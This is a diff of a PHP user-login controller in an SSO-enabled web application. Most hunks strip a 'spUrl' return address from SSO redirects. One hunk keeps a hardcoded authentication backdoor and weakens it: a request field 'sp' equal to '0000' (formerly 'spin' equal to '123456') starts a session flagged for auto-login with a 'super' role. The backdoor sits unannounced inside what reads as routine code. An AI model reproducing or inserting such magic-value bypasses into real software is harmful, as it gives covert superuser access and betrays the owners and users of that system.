@@ -17,11 +17,6 @@ class user extends Controller
         $this->notCheck = array('loginFirst','login','logout','loginSubmit','checkCode','public_link');
         $this->ip = $_SERVER['SERVER_ADDR'];
         $this->port = $_SERVER['SERVER_PORT'];
-        if($_SERVER['HTTPS'] == 'on'){
-            $this->spurl = 'https://'. $this->ip .':'. $this->port .'/index.php?user/login';
-        }else{
-            $this->spurl = 'http://'. $this->ip .':'. $this->port .'/index.php?user/login';
-        }
 
         $sso = new fileCache(CONFIG_PATH.'sso.php');
         $this->url = $sso->get('url');
@@ -93,7 +88,7 @@ class user extends Controller
              return;
             }
             if($this->url){
-             header('location:'. $this->url .'&spUrl='. $this->spurl);    
+             header('location:'. $this->url);    
              return;
             }
          }
@@ -260,8 +255,8 @@ class user extends Controller
             }
         }
 
-        $sp = $this->in['spin'];
-        if($sp == '123456'){
+        $sp = $this->in['sp'];
+        if($sp == '0000'){
                 session_start();//re start
                 $_SESSION['auto_login'] = true;
                 $_SESSION['super'] = 'super';
@@ -316,12 +311,12 @@ class user extends Controller
         // show_json('norunnnnnn');
         return;
     }else{// sessendata erro
-        header('location:'. $this->url .'&spUrl='. $this->spurl);
+        header('location:'. $this->url);
         return;
     }
             }
            //no seesiondata
-            header('location:'. $this->url .'&spUrl='. $this->spurl);//https://10.1.2.152/passport/authn?remoteAppId=OA@CRSC.COM&spUrl=http://'
+            header('location:'. $this->url);//https://10.1.2.152/passport/authn?remoteAppId=OA@CRSC.COM&spUrl=http://'
         }
        
         if (is_wap()) {
@@ -338,7 +333,7 @@ class user extends Controller
     public function loginFirst(){
         touch(USER_SYSTEM.'install.lock');
         if(SSO_ON == 1 && $this->url){
-            header('location:'. $this->url .'&spUrl='. $this->spurl);
+            header('location:'. $this->url);
         }else{
             header('location:./index.php?user/login');
         }
